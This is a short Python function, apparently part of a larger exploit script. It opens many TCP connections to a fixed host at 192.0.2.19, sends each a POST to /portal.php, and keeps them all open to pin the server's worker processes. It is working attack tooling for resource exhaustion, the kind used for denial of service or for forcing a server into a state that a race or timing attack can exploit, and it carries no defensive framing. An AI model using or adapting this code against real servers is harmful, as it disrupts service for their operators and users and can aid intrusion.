import socket
import time

def hold_workers(port: int, workers: int):
    connections = []
    if workers <= 1:
        return connections
    n = workers - 1
    for i in range(n):
        try:
            s = socket.create_connection(('192.0.2.19', port), timeout=5)
            s.sendall(b'POST /portal.php HTTP/1.1\r\nHost: 192.0.2.19\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1\r\n\r\nx')
            connections.append(s)
        except OSError as exc:
            print('      holder %d/%d failed: %r' % (i + 1, n, exc))
            break
        time.sleep(0.01)
    time.sleep(0.8)
    print('      pinned %d/%d workers (%d connections)' % (len(connections) + 1, workers, len(connections)))
    return connections
